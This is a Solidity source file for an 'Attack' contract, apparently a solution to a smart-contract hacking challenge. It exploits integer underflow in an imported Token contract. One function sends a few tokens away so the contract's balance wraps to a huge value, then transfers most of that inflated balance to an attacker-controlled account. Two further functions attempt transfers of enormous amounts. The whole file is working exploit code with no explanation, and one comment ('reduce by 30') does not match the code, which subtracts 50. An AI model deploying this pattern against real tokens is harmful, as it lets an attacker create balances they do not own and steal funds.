// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Token.sol";

contract Attack {
    Token public tokenContract;

    uint max = 2 ** 256 - 1;

    constructor(address payable _tokenContract) public {
        tokenContract = Token(_tokenContract);
    }

    function attackOne(address _attackEoa) public {
        // call the attack contract and pass in the address of my EOA
        tokenContract.transfer(_attackEoa, 23);
        // Balance of address(this) will be a high overflowed value
        uint balance = tokenContract.balanceOf(address(this));
        // reduce by 30 se we don't end up with an overflow back to our original value
        balance = balance - 50;

        // transfer this new high balance to my attacker address
        tokenContract.transfer(_attackEoa, balance);
    }

    function attackTwo(address _attackEoa) public {
        // call the attack contract and pass in the address of my EOA
        tokenContract.transfer(_attackEoa, 200000000000);
    }

    function attackThree(address _attackEoa) public {
        // call the attack contract and pass in the address of my EOA
        tokenContract.transfer(_attackEoa, max);
    }

    function viewValue() public view returns (uint) {
        uint balance = tokenContract.balanceOf(address(this));
        return balance;
    }

    receive() external payable {}
}
